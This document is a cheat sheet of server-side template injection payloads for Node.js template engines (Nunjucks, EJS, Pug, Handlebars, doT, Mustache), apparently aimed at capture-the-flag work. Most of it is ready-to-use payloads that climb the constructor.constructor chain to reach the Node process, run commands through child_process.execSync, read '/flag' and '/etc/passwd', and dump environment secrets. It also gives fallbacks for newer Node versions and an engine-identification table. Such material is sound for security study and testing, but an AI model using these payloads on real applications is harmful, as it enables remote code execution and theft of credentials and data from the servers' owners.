# Node.js engines — Nunjucks, EJS, Pug, Handlebars, doT

JS-side SSTI — escapes reach `require`/process → RCE or file-read.
Different syntax per engine, same object-model logic.

---

## 1. Nunjucks — Jinja-like JS engine

```javascript
{{7*7}}            → 49
{{7*'7'}}          → 49 (JS semantics — distinguishes from Jinja2)
{{range(1,3)}}      -- function probe
{{cycler}}         -- similar to jinja helpers
{{global}}          -- context dump
{{this}}            -- the context object
{{this.constructor}}                    -- Object constructor
{{this.constructor.constructor('return process')()}}  -- Function!
{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')()}}
{{this.constructor.constructor('return process.env')()}}
```

`constructor.constructor` reaches `Function` → `return process`
gives the Node process object → `mainModule.require` or
`process.binding`/`require` chain:

```javascript
{{this.constructor.constructor('return global.process.mainModule.require("child_process").execSync("cat /flag").toString()')()}}
{{this.constructor.constructor('return global.process.mainModule.require("fs").readFileSync("/flag","utf8")')()}}
{{this.constructor.constructor('return process.env.FLAG')()}}
{{this.constructor.constructor('return process.env')()}}     -- all env
```

Newer Node deprecates `process.mainModule` → use `require` if
available or `process.binding`/`spawn_sync`:

```javascript
{{this.constructor.constructor('return process.mainModule?process.mainModule.require("child_process").execSync("id"):process.binding("spawn_sync")')()}}
```

---

## 2. EJS — `<%= %>` embedded JS

```ejs
<%= 7*7 %>                        → 49 (evaluated)
<%= process %>                     -- process object
<%= process.env %>
<%= global.process.mainModule.require('child_process').execSync('id') %>
<%= global.process.mainModule.require('fs').readFileSync('/flag','utf8') %>
<%= require('child_process').execSync('id') %>     -- if require bound
<%= this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') %>
```

EJS `<%= %>` runs JS expressions — RCE is one `require` away when
`require` is reachable or via `process.mainModule.require`.

`<% code %>` runs statements; `<%- %>` unescaped output.

---

## 3. Pug/Jade — `#{expr}` and `!{html}`

```pug
#{7*7}                  → 49
#{global.process}
#{global.process.mainModule.require('child_process').execSync('id')}
#{this.constructor.constructor('return process')()}
!{x}                    -- unescaped buffer — XSS not RCE
#{function(){return global.process.mainModule.require('child_process').execSync('id')}()}
```

Pug's `#{}` interpolates JS expressions — full Node access via
`global`/`process`/`constructor.constructor`.

---

## 4. Handlebars — the helper-gated engine

```handlebars
{{this}}                  -- the context object
{{@root}}                  -- root context
{{constructor}}            -- Object constructor ref
{{lookup this 'constructor'}} -- dynamic lookup
{{#with 'x' as |x|}}{{x.constructor.constructor('return process')()}}{{/with}}
   -- with-block brings 'x' into scope → constructor chain

{{#with "s" as |string|}}
  {{#with split "e" as |cons|}}
    {{#with (concat "return process") as |code|}}
      {{#with (string.constructor.constructor code) as |fn|}}
        {{fn}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
   -- the famous handlebars-RCE chain — needs 'split','concat',
      'with' helpers — versions <4.x era
```

Handlebars is sandboxed-ish — `constructor` access was gated in
4.x (`allowProtoPropertiesByDefault`/`allowProtoMethodsByDefault`).
If the app enables proto-props → the constructor chain opens.

```handlebars
{{#with this}}
  {{lookup this 'constructor'}}
{{/with}}
{{this.__proto__}}           -- proto-access — gated by default 4.x+
{{#each this}}{{@key}}={{this}}{{/each}}   -- dump context
{{@global}}                   -- global scope if enabled
{{@root.constructor}}
```

---

## 5. doT — `{{=x}}` delimiters

```javascript
{{= 7*7}}                              → 49
{{= global.process }}
{{= global.process.mainModule.require('child_process').execSync('id') }}
{{= this.constructor.constructor('return process')() }}
{{? 7*7===49 }}yes{{?}}                 -- conditionals {{?}}
{{~x :i}}...{{~}}                        -- loops
```

doT compiles templates to JS functions — `{{=}}` interpolates,
`{{?}}`/`{{~}}` are conditionals/loops — all run JS.

---

## 6. Mustache — logic-less, limited

```handlebars
{{x}}          -- escaped — HTML entities
{{{x}}}        -- unescaped — XSS path
{{&x}}         -- unescaped
{{#x}}...{{/x}}  -- sections — context-switch
{{>partial}}    -- partials — file-include!
```

Mustache has NO expressions — only lookups. No `7*7` eval → can't
RCE. Injection paths: `{{{x}}}`-context XSS (markup renders), or
`{{>../../etc/passwd}}` partial-traversal (some impls allow path
partials → file read).

---

## 7. The common Node escape — `constructor.constructor`

Every JS engine shares the same endgame:

```javascript
this.constructor.constructor('return process')()
   → Function() → returns process → full Node

(''+'').sub.constructor.constructor('return process')()
x.constructor.constructor('return process.mainModule')()
x.constructor.constructor('return process.env.FLAG')()
```

`process.mainModule.require` may be undefined on newer Node —
fallbacks:

```javascript
this.constructor.constructor('return process')().binding('spawn_sync')
this.constructor.constructor('return process')().env
this.constructor.constructor('return global.require')()       -- if bound
this.constructor.constructor('return module.constructor._load')()
   -- module._load is the internal require — version-dependent
```

---

## 8. The engine-ID quick-table

| Syntax | Engine |
|---|---|
| `{{x}}` + `{% %}` + JS-semantics (49) | Nunjucks |
| `<%= %>`/`<%- %>` | EJS |
| `#{x}`/`!{x}` | Pug/Jade |
| `{{x}}`/`{{{x}}}`/`{{#x}}` | Handlebars/Mustache |
| `{{=x}}`/`{{?}}`/`{{~}}` | doT |
| `{{!x}}` comment | Handlebars |
| `<% %>` | EJS also (statement ctx) |

The single discriminator for `{{7*7}}`=49 engines:
`{{7*'7'}}` → `49` = JS-side (Nunjucks), `7777777` = Jinja2.
